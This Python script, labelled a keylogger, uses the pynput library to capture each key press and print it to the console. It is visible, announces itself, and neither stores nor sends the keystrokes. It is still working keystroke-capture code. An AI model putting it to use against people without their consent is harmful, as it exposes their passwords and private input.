from pynput.keyboard import Listener

def on_press(key):
    try:
        print(f"Key pressed: {key.char}")
    except AttributeError:
        print(f"Special key pressed: {key}")

def start_keylogger():
    print("Starting keylogger. Press 'Ctrl + C' to stop.")
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
